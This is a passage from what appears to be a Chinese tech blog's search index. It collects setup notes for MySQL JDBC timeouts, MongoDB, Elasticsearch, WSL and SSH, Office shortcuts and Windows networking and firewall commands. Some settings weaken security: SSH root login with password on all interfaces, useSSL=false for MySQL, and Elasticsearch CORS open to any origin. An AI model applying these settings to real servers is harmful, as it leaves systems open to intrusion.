在一条语句中，允许使用“;”来分隔多条查询                      | false     | true                      |\n| failOverReadOnly      | 在autoReconnect模式下出现故障切换时，是否应将连接设置为“只读” | true      | false                     |\n| useSSL                | 与服务器进行通信时使用SSL                                    | true      | false                     |\n| useUnicode            | 是否使用Unicode                                              | false     | true                      |\n| socketTimeout         | 数据库无返回时，应用等待时间（ms）。要大于等于数据库配置的Socket TimeOut的值 | 0         | 60000                     |\n| serverTimezone        | 配置时区                                                     | 系统时区  | Asia/Shanghai <br>GMT%2B8 |\n| zeroDateTimeBehavior  | 配置空值存入DataTime<br><br/>1.\texception：默认值，即抛出SQL state [S1009]. Cannot convert value....的异常<br/>2.\tconvertToNull：将日期转换成NULL值<br/><br/>3.\tround：替换成最近的日期即0001-01-01 | exception | convertToNull             |\n\n时区异常处理\n\n错误信息\n\n```\n…  is unrecognized or represents more than one time zone\n```\n\n配置时区\n\n```\njdbc:mysql://localhost:3306/db?useUnicode=true&characterEncoding=UTF-8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=Asia/Shanghai\n```\n\n## 数据库客户端超时设置\n\n数据库客户端的超时主要可以分为JDBC超时/连接池超时/Statement超时/事务超时等。\n\n### 超时配置的关系和层级示意图\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/be1022af-1837-42c2-ae32-9d7e0ec4aa2c.png)    \n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/43530e52-774a-401b-8e8c-0e10e2cc0fdc.png) \n\n上图中，更上层的超时依赖于下层的超时，只有当较低层的超时机制正常工作，上层的超时才会正常。如果 JDBC 驱动程序的socket超时工作不正常，那么更上层的超时比如 Statement 超时和事务超时都不会正常工作。\n\n\n\n### Transaction Timeout(事务超时)\n\n​\t\ttransaction timeout一般存在于框架（Spring, EJB）或应用级。transaction timeout或许是个相对陌生的概念，简单地说，transaction timeout就是“statement Timeout * N（需要执行的statement数量） + @（垃圾回收等其他时间）”。\n\n​\t\ttransaction timeout用来限制执行statement的总时长。\n\n​\t\t例如：假设执行一个statement需要0.1秒，那么执行少量statement不会有什么问题，但若是要执行100,000个statement则需要10,000秒（约7个小时）。这时，transaction timeout就派上用场了。EJB CMT (Container Managed Transaction)就是一种典型的实现，它提供了多种方法供开发者选择。但我们并不使用EJB，Spring的transaction timeout设置会更常用一些。在Spring中，你可以使用下面展示的XML或是在源码中使用@Transactional注解来进行设置。 \n\n```xml\n<tx:attributes>  \n        <tx:method name=\"…\" timeout=\"3\"/>  \n</tx:attributes>  \n```\n\n​\t\tSpring提供的transaction timeout配置非常简单，它会记录每个事务的开始时间和消耗时间，当特定的事件发生时就会对消耗时间做校验，当超出timeout值时将抛出异常。 \n\n　　Spring中，被保存在ThreadLocal里，这被称为事务同步（Transaction Synchronization），与此同时，事务的开始时间和消耗时间也被保存下来。当使用这种代理连接创建statement时，就会校验事务的消耗时间。EJB CMT的实现方式与之类似，其结构本身也十分简单。 \n\n　　当你选用的容器或框架并不支持transaction timeout这一特性，你可以考虑自己来实现。transaction timeout并没有标准的API。Lucy框架的1.5和1.6版本都不支持transaction timeout，但是你可以通过使用Spring的Transaction Manager来达到与之同样的效果。 \n\n　　假设某个事务中包含5个statement，每个statement的执行时间是200ms，其他业务逻辑的执行时间是100ms，那么transaction timeout至少应该设置为1,100ms（200 * 5 + 100）。\n\n\n\n### Statement Timeout\n\n​\t\tstatement timeout用来限制statement的执行时长，timeout的值通过调用JDBC的.sql.Statement.setQueryTimeout(int timeout) API进行设置。不过现在开发者已经很少直接在代码中设置，而多是通过框架来进行设置。 \n\n　　以iBatis为例，statement timeout的默认值可以通过**map-config.xml**中的**defaultStatementTimeout** 属性进行设置。同时，你还可以设置sqlmap中select，insert，update标签的timeout属性，从而对不同sql语句的超时时间进行独立的配置。 \n\n　　如果你使用的是Lucy1.5或1.6版本，通过设置**queryTimeout**属性可以在datasource层面对statement timeout进行设置。 \n\n　　statement timeout的具体值需要依据应用本身的特性而定，并没有可供推荐的配置\n\n\n\n#### \tQueryTimeout处理过程\n\n1. 通过调用Connection的createStatement()方法创建statement \n\n2. 调用**statement**的executeQuery()方法 \n\n3. **statement**通过自身connection将query发送给MySQL数据库 \n\n4. **statement**创建一个新的timeout-execution线程用于超时处理\n\n5. 5.1版本后改为每个connection分配一个timeout-execution线程 \n\n6. 向timeout-execution线程进行注册 \n\n7. 达到超时时间 \n\n8. TimerThread调用JtdsStatement实例中的TsdCore.cancel()方法 \n\n9. timeout-execution线程创建一个和statement配置相同的connection \n\n10. 使用新创建的connection向超时query发送cancel query（KILL QUERY “connectionId”） \n\n![image-20211201004107227](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211201004107227.png) \n\n### JDBC的socket timeout\n\n​\t\tJDBC的 timeout在被突然停掉或是发生网络错误（由于设备故障等原因）时十分重要。由于TCP/IP的结构原因，socket没有办法探测到网络错误，因此应用也无法主动发现断开。如果没有设置socket timeout的话，应用在数据库返回结果前会无期限地等下去，这种连接被称为dead connection。 \n\n　　为了避免dead connections，socket必须要有超时配置。socket timeout可以通过JDBC设置，socket timeout能够避免应用在发生网络错误时产生无休止等待的情况，缩短服务失效的时间。 \n\n　　不推荐使用socket timeout来限制statement的执行时长，因此socket timeout的值必须要高于statement timeout，否则，socket timeout将会先生效，这样statement timeout就变得毫无意义，也无法生效。 \n\n​\t\t下面展示了socket timeout的两个设置项，不同的JDBC驱动其配置方式会有所不同。 \n\n- socket连接时的timeout：通过**Socket.connect(SocketAddress endpoint, int timeout)**设置\n\n- socket读写时的timeout：通过**Socket.setSoTimeout(int timeout)**设置\n\n  \n\n通过查看CUBRID，MySQL，MS SQL Server (JTDS)和Oracle的JDBC驱动源码，我们发现所有的驱动内部都是使用上面的2个API来设置socket timeout的。 \n\n- connectTimeout和socketTimeout的默认值为0时，timeout不生效。\n\n\n\n### 操作系统的socket timeout配置\n\n​\t\t如果不设置 timeout或connect timeout，应用多数情况下是无法发现网络错误的。因此，当网络错误发生后，在连接重新连接成功或成功接收到数据之前，应用会无限制地等下去。但是，通过本文开篇处的实际案例我们发现，30分钟后应用的连接问题奇迹般的解决了，这是因为操作系统同样能够对socket timeout进行配置。公司的Linux服务器将socket timeout设置为了30分钟，从而会在操作系统的层面对网络连接做校验，因此即使JDBC的socket timeout设置为0，由网络错误造成的问题的持续时间也不会超过30分钟。 \n\n　　通常，应用会在调用Socket.read()时由于网络问题被阻塞住，而很少在调用Socket.write()时进入waiting状态，这取决于网络构成和错误类型。当Socket.write()被调用时，数据被写入到操作系统内核的缓冲区，控制权立即回到应用手上。因此，一旦数据被写入内核缓冲区，Socket.write() 调用就必然会成功。但是，如果系统内核缓冲区由于某种网络错误而满了的话，Socket.write()也会进入waiting状态。这种情况下，操作系统会尝试重新发包，当达到重试的时间限制时，将产生系统错误。在我们公司，重新发包的超时时间被设置为15分钟。 \n\n### FAQ\n\n　　Q1. 我已经使用Statement.setQueryTimeout()方法设置了查询超时，但在网络出错时并没有产生作用。 \n\n　　➔ 查询超时仅在socket timeout生效的前提下才有效，它并不能用来解决外部的网络错误，要解决这种问题，必须设置JDBC的socket timeout。 \n\n　　Q2. transaction timeout，statement timeout和 timeout和DBCP的配置有什么关系？ \n\n　　➔ 当通过DBCP获取时，除了DBCP获取连接时的waitTimeout配置以外，其他配置对JDBC没有什么影响。 \n\n　　Q3. 如果设置了JDBC的socket timeout，那DBCP连接池中处于IDLE状态的连接是否也会在达到超时时间后被关闭？ \n\n　　➔ 不会。socket的设置只会在产生数据读写时生效，而不会对DBCP中的IDLE连接产生影响。当DBCP中发生新连接创建，老的IDLE连接被移除，或是连接有效性校验的时候，socket设置会对其产生一定的影响，但除非发生网络问题，否则影响很小。 \n\n\n\n## JDBC安全链接警告\n\n\n\n用JDBC连接Mysql 5.6的时候，log里面一直有如下的warning, 虽然并不是error，但是log里面在每次连接数据库的时候会一直打印这个warning.\n\n```sql\nWARN: Establishing SSL connection without server's identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn't set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to 'false'. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.\n```\n\n可以在JDBC的配置里面添加useSSL=false配置使用非SSL连接即可：\n\n```properties\njdbc.url=jdbc:mysql://localhost:3306/test?useUnicode=true&characterEncoding=UTF-8&useSSL=false\n```\n\n备注：启用SSL加密连接后，性能必然会有下降\n\n由于SSL开销较大的环节在建立连接，所以短链接的开销可能会更大，因此推荐使用长连接或者连接池的方式来减小SSL所带来的额外开销，不过好在MySQL的应用习惯大部分也是长连接的方式。\n\n总结 \n\n1.MySQL 5.7配置SSL要比5.6来的简单的多 \n\n2.MySQL 5.7客户端默认开启SSL加密连接 \n\n3.通常来说，开启SSL加密连接后，性能最大的开销在25%左右\n","tags":["MySQL"],"categories":["数据库","MySQL"]},{"title":"MongoDB安装","url":"/20250619/c5d54bc1.html","content":"\n# Windows 安装\n\n## 安装文件\n\n现官网只含64位的安装文件，或者去以下路径下载： http://dl.mongodb.org/dl/win32/x86_64\n\n## 环境变量\n\n```\nMONGODB_HOME：D:\\ProgramSoft\\MongoDB\n\npath追加：%MONGODB_HOME%\\bin;\n```\n\n\n\n## 安装服务\n\n 前提：创建文件夹 `E:\\ProgramData\\db` 和 `E:\\ProgramData\\log`\n\n系统管理员操作\n\n1. 创建服务\n\n```bash\nsc create mongodb binPath= \"D:\\ProgramSoft\\MongoDB\\bin\\mongod.exe --service --dbpath E:\\ProgramData\\db --logpath=E:\\ProgramData\\log\\mongodb.log --logappend\"\n```\n\n2. 删除服务\n\n```bash\nsc delete mongodb\n```\n\n![460c99600f3e8207ce486a218ed21620.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-16383252343726.png)  \n\n错误记录： \n\n![6495b50cee3c37ebdbff17f02d31dd12.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16383252343727.png)  \n\n异常1： 服务开启不了 发生服务特定错误: 100，发生服务特定错误: 48\n原因，service安装语句\n\n```\nsc create mongodb binPath= \"D:\\ProgramSoft\\MongoDB\\bin\\mongod.exe --service --dbpath D:\\mongodb\\data --logpath=E:\\ProgramData\\log\\mongodb.log --logappend --directoryperdb\"\n```\n\n 解决方案：\n\n1. 删除`E:\\ProgramData\\db\\mongod.lock文件`\n\n2. 删除服务\n\n   ```\n   net stop mongodb;\n   net delete mongodb;\n   ```\n\n3. 重新安装 注意：去除` --directoryperdb `命令\n\n   ```\n   sc create mongodb binPath= \"D:\\ProgramSoft\\MongoDB\\bin\\mongod.exe --service --dbpath D:\\mongodb\\data --logpath=E:\\ProgramData\\log\\mongodb.log --logappend\"\n   ```\n\n\n\n\n# Docker\n\n```yaml\nversion: '3.9'\nservices:\n    mongodb:\n        image: mongo:4.2.2\n        container_name: \"mongodb\"\n        restart: always\n        environment:\n            - TZ=Asia/Shanghai\n            - MONGO_INITDB_ROOT_USERNAME=admin\n            - MONGO_INITDB_ROOT_PASSWORD=你的密码\n        volumes:\n            - /opt/docker_data/mongo/logs:/var/log/mongodb\n            - /opt/docker_data/mongo/data/db:/data/db\n            - /opt/docker_data/mongo/data/configdb:/data/configdb\n        ports:\n            - 27017:27017\n```\n\n","tags":["MongoDB"],"categories":["数据库","MongoDB"]},{"title":"ElasticSearch安装","url":"/20250619/872a239c.html","content":"\n\n\n# Docker \n\n参考：https://new.nanxiangquan.com/2023/04/26/docker%E9%83%A8%E7%BD%B2elk/\n\n## 单机\n\n### docker-compose\n\n```yaml\nversion: '3.9'\nservices:\n  elasticsearch-standalone:\n    image: elasticsearch:7.2.0\n    container_name: elasticsearch-standalone\n    privileged: true\n    restart: always\n    environment:\n      - TZ=Asia/Shanghai\n      - cluster.name=elasticsearch-standalone\n      - node.name=node01\n      - cluster.initial_master_nodes=[\"node01\"]\n\n    volumes:\n      # - /opt/docker_data/elasticsearch-standalone/config/elasticsearch.keystore:/usr/share/elasticsearch/config/elasticsearch.keystore\n      - /opt/docker_data/elasticsearch-standalone/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml\n      - /opt/docker_data/elasticsearch-standalone/config/log4j2.properties:/usr/share/elasticsearch/config/log4j2.properties\n      - /opt/docker_data/elasticsearch-standalone/config/jvm.options:/usr/share/elasticsearch/config/jvm.options\n      # - /opt/docker_data/elasticsearch-standalone/config/role_mapping.yml:/usr/share/elasticsearch/config/role_mapping\n      # - /opt/docker_data/elasticsearch-standalone/config/roles.yml:/usr/share/elasticsearch/config/roles\n      # - /opt/docker_data/elasticsearch-standalone/config/users:/usr/share/elasticsearch/config/users\n      # - /opt/docker_data/elasticsearch-standalone/config/users_roles:/usr/share/elasticsearch/config/users_roles\n      - /opt/docker_data/elasticsearch-standalone/data:/usr/share/elasticsearch/data\n      - /opt/docker_data/elasticsearch-standalone/logs:/usr/share/elasticsearch/logs\n    ports:\n      - 9200:9200\n      - 9300:9300\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n```\n\n​         其中的配置文件：\n\n- \telasticsearch.yml\n\n```yaml\nnode.master: true\nnode.data: true\nbootstrap.memory_lock: true\nnetwork.host: 0.0.0.0\nhttp.port: 9200\ntransport.tcp.port: 9300\n\n\npath.data: /usr/share/elasticsearch/data  \npath.logs: /usr/share/elasticsearch/logs    \n\nhttp.cors.enabled: true\nhttp.cors.allow-origin: \"*\"\nhttp.cors.allow-headers: Authorization\nxpack.security.enabled: true\nxpack.security.transport.ssl.enabled: true\n\ndiscovery.zen.ping_timeout: 120s\nclient.transport.ping_timeout: 60s\n```\n\n\n\n- \tjvm.options\n\n```properties\n\t## JVM configuration\n\n################################################################\n## IMPORTANT: JVM heap size\n################################################################\n##\n## You should always set the min and max JVM heap\n## size to the same value. For example, to set\n## the heap to 4 GB, set:\n##\n## -Xms4g\n## -Xmx4g\n##\n## See https://www.elastic.co/guide/en/elasticsearch/reference/current/heap-size.html\n## for more information\n##\n################################################################\n\n# Xms represents the initial size of total heap space\n# Xmx represents the maximum size of total heap space\n\n-Xms2g\n-Xmx2g\n\n################################################################\n## Expert settings\n################################################################\n##\n## All settings below this section are considered\n## expert settings. Don't tamper with them unless\n## you understand what you are doing\n##\n################################################################\n\n## GC configuration\n-XX:+UseConcMarkSweepGC\n-XX:CMSInitiatingOccupancyFraction=75\n-XX:+UseCMSInitiatingOccupancyOnly\n\n## G1GC Configuration\n# NOTE: G1GC is only supported on JDK version 10 or later.\n# To use G1GC uncomment the lines below.\n# 10-:-XX:-UseConcMarkSweepGC\n# 10-:-XX:-UseCMSInitiatingOccupancyOnly\n# 10-:-XX:+UseG1GC\n# 10-:-XX:InitiatingHeapOccupancyPercent=75\n\n## DNS cache policy\n# cache ttl in seconds for positive DNS lookups noting that this overrides the\n# JDK security property networkaddress.cache.ttl; set to -1 to cache forever\n-Des.networkaddress.cache.ttl=60\n# cache ttl in seconds for negative DNS lookups noting that this overrides the\n# JDK security property networkaddress.cache.negative ttl; set to -1 to cache\n# forever\n-Des.networkaddress.cache.negative.ttl=10\n\n## optimizations\n\n# pre-touch memory pages used by the JVM during initialization\n-XX:+AlwaysPreTouch\n\n## basic\n\n# explicitly set the stack size\n-Xss1m\n\n# set to headless, just in case\n-Djava.awt.headless=true\n\n# ensure UTF-8 encoding by default (e.g. filenames)\n-Dfile.encoding=UTF-8\n\n# use our provided JNA always versus the system one\n-Djna.nosys=true\n\n# turn off a JDK optimization that throws away stack traces for common\n# exceptions because stack traces are important for debugging\n-XX:-OmitStackTraceInFastThrow\n\n# flags to configure Netty\n-Dio.netty.noUnsafe=true\n-Dio.netty.noKeySetOptimization=true\n-Dio.netty.recycler.maxCapacityPerThread=0\n\n# log4j 2\n-Dlog4j.shutdownHookEnabled=false\n-Dlog4j2.disable.jmx=true\n\n-Djava.io.tmpdir=${ES_TMPDIR}\n\n## heap dumps\n\n# generate a heap dump when an allocation from the Java heap fails\n# heap dumps are created in the working directory of the JVM\n-XX:+HeapDumpOnOutOfMemoryError\n\n# specify an alternative path for heap dumps; ensure the directory exists and\n# has sufficient space\n-XX:HeapDumpPath=data\n\n# specify an alternative path for JVM fatal error logs\n-XX:ErrorFile=logs/hs_err_pid%p.log\n\n## JDK 8 GC logging\n\n8:-XX:+PrintGCDetails\n8:-XX:+PrintGCDateStamps\n8:-XX:+PrintTenuringDistribution\n8:-XX:+PrintGCApplicationStoppedTime\n8:-Xloggc:logs/gc.log\n8:-XX:+UseGCLogFileRotation\n8:-XX:NumberOfGCLogFiles=32\n8:-XX:GCLogFileSize=64m\n\n# JDK 9+ GC logging\n9-:-Xlog:gc*,gc+age=trace,safepoint:file=logs/gc.log:utctime,pid,tags:filecount=32,filesize=64m\n# due to internationalization enhancements in JDK 9 Elasticsearch need to set the provider to COMPAT otherwise\n# time/date parsing will break in an incompatible way for some date patterns and locals\n9-:-Djava.locale.providers=COMPAT\n\n```\n\n- \tlog4j2.properties\n\n```properties\nstatus = error\n\n# log action execution errors for easier debugging\nlogger.action.name = org.elasticsearch.action\nlogger.action.level = debug\n\nappender.rolling.type = Console\nappender.rolling.name = rolling\nappender.rolling.layout.type = ESJsonLayout\nappender.rolling.layout.type_name = server\n\nrootLogger.level = info\nrootLogger.appenderRef.rolling.ref = rolling\n\nappender.deprecation_rolling.type = Console\nappender.deprecation_rolling.name = deprecation_rolling\nappender.deprecation_rolling.layout.type = ESJsonLayout\nappender.deprecation_rolling.layout.type_name = deprecation\n\nlogger.deprecation.name = org.elasticsearch.deprecation\nlogger.deprecation.level = warn\nlogger.deprecation.appenderRef.deprecation_rolling.ref = deprecation_rolling\nlogger.deprecation.additivity = false\n\nappender.index_search_slowlog_rolling.type = Console\nappender.index_search_slowlog_rolling.name = index_search_slowlog_rolling\nappender.index_search_slowlog_rolling.layout.type = ESJsonLayout\nappender.index_search_slowlog_rolling.layout.type_name = index_search_slowlog\n\nlogger.index_search_slowlog_rolling.name = index.search.slowlog\nlogger.index_search_slowlog_rolling.level = trace\nlogger.index_search_slowlog_rolling.appenderRef.index_search_slowlog_rolling.ref = index_search_slowlog_rolling\nlogger.index_search_slowlog_rolling.additivity = false\n\nappender.index_indexing_slowlog_rolling.type = Console\nappender.index_indexing_slowlog_rolling.name = index_indexing_slowlog_rolling\nappender.index_indexing_slowlog_rolling.layout.type = ESJsonLayout\nappender.index_indexing_slowlog_rolling.layout.type_name = index_indexing_slowlog\n\nlogger.index_indexing_slowlog.name = index.indexing.slowlog.index\nlogger.index_indexing_slowlog.level = trace\nlogger.index_indexing_slowlog.appenderRef.index_indexing_slowlog_rolling.ref = index_indexing_slowlog_rolling\nlogger.index_indexing_slowlog.additivity = false\n```\n\n### 初始化密码\n\n```sh\n进入elasticsearch容器\n\ndocker exec -it elasticsearch bash\n\n进入bin目录\n\ncd bin/\n\n执行初始化密码\n\n./elasticsearch-setup-passwords interactive\n```\n\n","tags":["ElasticSearch"],"categories":["数据库","ElasticSearch"]},{"title":"WSL","url":"/20250619/784ee20b.html","content":"\n\n# WSL Ubuntu 系统迁移到其他位置的完整指南\n\n\n\n## **3. 修改 WSL 默认版本（WSL1 或 WSL2）**\n\n\n\n```\nwsl --set-default-version 2  # 设置新安装的发行版默认用 WSL2\nwsl --set-version <发行版名称> 2  # 将现有发行版转换为 WSL2\n```\n\n## 方法一：使用 `wsl --export` 和 `wsl --import` (推荐)\n\n\n\n### 1. 查看当前安装的 WSL 发行版\n\n \n\n```\nwsl --list --verbose\n```\n\n记录要迁移的 Ubuntu 发行版名称（如 `Ubuntu-24.04`）\n\n### 2. 导出当前系统到 tar 文件\n\n \n\n```\nwsl --export Ubuntu-24.04 D:\\wsl_backup\\ubuntu24.04.tar\n```\n\n### 3. 注销原系统\n\n \n\n```\nwsl --unregister Ubuntu-24.04\n```\n\n### 4. 导入到新位置\n\n \n\n```\nwsl --import Ubuntu-24.04 D:\\wsl_system\\ubuntu24.04 D:\\wsl_backup\\ubuntu24.04.tar --version 2\n```\n\n### 5. 设置默认用户\n\n```\n# 进入 root 环境\nwsl -d Ubuntu-24.04 -u root\n\n# 设置默认用户（替换 yourusername 为你的用户名）\necho -e \"[user]\\ndefault=yourusername\" >> /etc/wsl.conf\n\n# 退出\nexit\n```\n\n\n\n## **6. 修改默认发行版**\n\n```\nwsl --list --verbose  # 查看所有发行版\nwsl --set-default <发行版名称>  # 设置默认启动的发行版\n```\n\n\n\n# 在 WSL 中开放 22 端口 (SSH 服务) 的完整指南\n\n## 方法一：在 WSL 内部配置 SSH 服务\n\n### 1. 安装 SSH 服务器\n\n```\nsudo apt update && sudo apt install openssh-server -y\n```\n\n### 2. 配置 SSH 服务\n\n```\nsudo nano /etc/ssh/sshd_config\n```\n\n修改以下关键参数：\n\n```\nPort 22\nListenAddress 0.0.0.0\nPermitRootLogin yes           # 允许root登录\nPasswordAuthentication yes    # 允许密码认证\n```\n\n### 3. 重启 SSH 服务\n\n```\nsudo service ssh restart\n# 或使用 systemctl (如果启用了 systemd)\nsudo systemctl restart ssh\n```\n\n### 4. 检查服务状态\n\n```\nsudo service ssh status\n# 或\nsudo netstat -tulnp | grep 22\n```\n\n\n\n\n\n\n\n测试端口\n\n```\n# 安装 nc（Alpine）\napt-get install netcat-openbsd\n\n# 测试端口\nnc -zv mysql 3306\n```\n\n\n\n## **2. 确保 RabbitMQ 管理插件已启用**\n\nRabbitMQ 默认不启用 Web 管理界面，需手动启用：\n\n### **进入容器执行命令**\n\n\n\n```\ndocker exec -it <container_name> bash\n```\n\n### **在容器内启用管理插件**\n\n\n\n```\nrabbitmq-plugins enable rabbitmq_management\n```\n\n### **退出并重启容器**\n\n\n\n```\nexit\ndocker restart <container_name>\n```\n","tags":["操作系统"],"categories":["工具|部署","Windows"]},{"title":"WORD使用记录","url":"/20250619/8bc474d9.html","content":"\n\n\n\n\n# Word\n\n## 插入复选框\n\n```\n 输入“2611”，选中编号，按 “Alt+X”,是需要插入对勾,\n 输入“2612”，选中编号，按 “Alt+X”,是需要插入叉号\n```\n\n## 插入带圈数字\n\n1. 切换到英文输入法，按小键盘Num Lock键启小键盘。\n\n2. 将光标移到输入带圈的符处，打小键盘2460，接着按组合键Alt +X松开，这时刚才显示的2460就转换成带圈字符①。\n   打小键盘2473，接着按组合键Alt +X松开，这时刚才显示的2473就转换成带圈字符⑳。\n\n3. 以下是带圈数字1-20的代码对应关系：\n\n   ```\n   1/2460；\n   2/2461；\n   3/2462；\n   4/2463；\n   5/2464；\n   6/2465；\n   7/2466；\n   8/2467；\n   9/2468；\n   10/2469；\n   11/246a；\n   12/246b；\n   13/246c；\n   14/246d；\n   15/246e；\n   16/246f；\n   17/2470；\n   18/2471；\n   19/2472；\n   20/ 2473 \n   ```\n\n4. 20以上的暂没有快捷方式，可用其它方法输入，如用“格式”→“中文版式”→“带圈字符”来打。\n\n\n\n# Excel\n\n## 输入时间\n\n| 快捷键         |                                                        |\n| -------------- | ------------------------------------------------------ |\n| `ctrl+;`       | `输入日期`                                             |\n| `ctrl+shift+#` | `应用含年，月，日的``“``日期``”``格式`                 |\n| `ctrl+shift+;` | `插入时间`                                             |\n| `ctrl+shift+@` | `应用含小时和分钟并标明上午或下午的``“``时间``”``格式` |\n\n## 显示被自动隐藏的单引号\n\n1. 设置单元格格式——数字选项卡——自定义：自己在那里输入 \"'\"@——确定！\n\n2. 使用公式：=\"'\"&A2\n\n   ![image-20211124164907695](D:/_NoteSpace/Hexo/hmxyl/source/_images/image-20211124164907695-1667118851035-16-1678131278661-19-1749023621579-1.png) \n","tags":["Office"],"categories":["工具|部署","Windows"]},{"title":"Windows日常使用问题记录","url":"/20250619/d9a8c0d4.html","content":"\n# Windows 查看端口占用\n\n1. 获取占用端口的进程ID  `netstat -ano|findstr 10001`\n\n2. 获取进程信息 `tasklist|findstr 9352`\n\n3. 关闭进程（强行关闭） `taskkill /PID 9140 /T /F`\n\n\n\n# Windows 删除服务\n\n> 1. 列出所有服务，确认要删除的服务名称：\n>\n>   > sc query state= all | find \"SERVICE_NAME\"\n>\n> 2. 查看指定服务的详细信息：\n>\n>   > sc queryex <服务名>\n>\n> 3. 停止服务\n>\n>   > net stop MySQL\n>\n> 4. 删除服务\n>\n>   > sc delete MySQL\n>\n> 5. 验证是否已删除\n>\n>   > sc query MySQL\n\n\n\n\n\n\n\n# Windows网络配置\n\n## 重置网络设置\n\n> netsh winsock reset\n\n## 配置IP\n> - 查看接口名称：\n> netsh interface ip show interface\n> netsh interface ip show config\n> - 配置接口地址：\n> netsh interface ipv4 set address name=\"以太网\" static 192.168.10.10 255.255.255.0 192.168.1.1\n> -  配置dhcp自动获取ip\n> netsh interface ipv4 set address name=\"以太网\" source=dhcp\n\n## 配置DNS\n\n> - 配置DNS服务器\n> netsh interface ipv4 set dnsserver name=\"以太网\" static 223.5.5.5 index=1\n> netsh interface ipv4 set dnsserver name=\"以太网\" static 223.6.6.6 index=2\n> - 自动获取\n> netsh interface ipv4 set dnsserver name=\"以太网\" source=dhcp\n\n\n\n\n# Windows 设置护眼颜色\n\n> 豆沙绿 `RGB（202，234，206），#CAEACE`\n>\n> 淡黄色`RGB（253，246，227），#FDF6E3 【选用】`\n\n1. 首先使用 Win + R 组合快捷键，打开“运行”，然后键入打开注册表命令「regedit」，按回车键确认打开，如图所示 \n\n2. 打开Win10注册表之后，依次在左侧树状菜单中展开：HKEY_CURRENT_USER\\Control Panel\\Colors然后再右侧找到「Windows」值，并双击打开，将默认的255 255 255（默认是白色背景）三组颜色数值改成 253，246，227完成后，点击下方的“确定”保存，如图所示。 \n\n   ![image.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124002345774-1678131778293-28.png) \n\n3. 继续找到注册表的路径：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\DefaultColors\\Standard \n\n   同样再在右侧找到「Windows」双击打开，将默认的数据值 ffffff 改成  FDF6E3 完成后，点击下方的确定保存如下图所示。 \n\n   ![image.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211124002408921-1678131778293-30.png) \n\n   完成以上三步操作后，需要重启电脑生效\n\n\n\n# Windows 命令行命令记录\n\n| 说明                             | 命令                   |\n| -------------------------------- | ---------------------- |\n| ipconfig /flushdns               | Windows刷新DNS命令     |\n| wmic memphysical get maxcapacity | 查看支持的最大内存容量 |\n|                                  |                        |\n\n\n\n# Windows将 jar注册成windows服务\n\n- 下载Windows Service Wrapper ：https://github.com/winsw/winsw/releases\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/1242201-20191226150203417-575070520.png) \n\n- 安装windows服务\n\n1. 将java jar包和下载的WinSW.NET4.exe放在同一个文件夹目录下面\n\n2. 重命名WinSW.NET4.exe为MyApp.exe(这个可以任意取)，新建个MyApp.xml(这个必须和前者的exe文件名字相同)\n\n3. 编辑MyApp.xml文件\n\n   ```xml\n   <configuration>\n   <id>MyApp</id>\n   <name>MyApp</name>\n   <description>This is MyApp.</description>\n   \n   <executable>java</executable>\n   <arguments>-jar C:\\Users\\tanhw119214\\Desktop\\MyApp\\MyApp.jar</arguments>\n   <!-- 开机启动 -->\n   <startmode>Automatic</startmode>\n   <!-- 要注册服务的文件的父路径 -->\n   <logpath>C:\\Users\\tanhw119214\\Desktop\\MyApp\\logs</logpath>\n   <log mode=\"roll-by-time\">\n   <pattern>yyyyMMdd</pattern>\n   </log>\n   </configuration>\n   ```\n\n4. 进入根目录下面，执行以下cmd命令，注册服务。\n\n   ```xml\n   MyApp.exe install \n   ```\n\n   然后在服务里面就能找到这个实例了\n   ```sh\n   #启动命令\n   net start MyApp\n   #停止命令\n   net stop MyApp\n   #卸载命令\n   sc delete MyApp\n   ```\n\n\n\n# VPN连接报错\n\n- 问题描述\n\n  确认VPN信息正确的条件下，选择`PPTP`协议连接，提示 “不能建立到远程计算机的连接。你可能需要更改此连接的网络设置” 的错误\n\n- 问题排除\n\n  `event` 打开 `事件查看器`，获取VPN连接失败错误代码\n\n  ![image-20250604162326072](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20250604162326072.png) \n\n- 搜索对应的问题描述：[尝试建立 VPN 连接时出现“失败后返回的错误代码为 720”](https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/networking/troubleshoot-error-720-when-establishing-a-vpn-connection)\n\n- 最终解决方案：重新安装 WAN 微型端口 (IP) 接口驱动程序\n\n\n\n# Windows 开放端口（8080）\n\n## 查看端口\n\n> 查看端口： `>netstat -nao|findstr :8080` \n>\n> - **`netstat`**：网络统计工具（Network Statistics），用于监控网络连接和协议统计\n> - **`-n`**：以数字形式显示地址和端口（不解析为主机名或服务名）\n> - **`-a`**：显示所有活动的连接和监听的端口（包括 TCP 和 UDP）\n> - 配合 `-p`（Linux）或 `-o`（Windows）查看进程 PID\n\n## 命令行添加\n\n```bat\n# 管理员运行\nnetsh advfirewall firewall add rule name=\"Tomcat Port 8080\" dir=in action=allow protocol=TCP localport=8080\nnetsh advfirewall firewall add rule name=\"Tomcat Port 8080\" dir=out action=allow protocol=TCP localport=8080\n```\n\n## 控制面板添加\n\n**控制面板 -> 所有控制面板项 -> Windows 防火墙 -> 高级设置** 进入\n\n入站规则设置\n 第一步 选择 **入站规则** 然后 新建规则，选择 **端口**，然后下一步\n 第二步 选择**TCP** 选择**特定端口** 然后输入端口，如有多个端口需要用逗号隔开了 例如:88,8080\n 第三步 选择**允许连接**\n 第四步 选择应用规则的范围\n 第五步 输入规则名称\n\n\n\n 出站规则设置\n 第一步 选择 **出站规则** 然后 **新建规则**，选择 端口，然后下一步\n 第二步 选择**TCP** 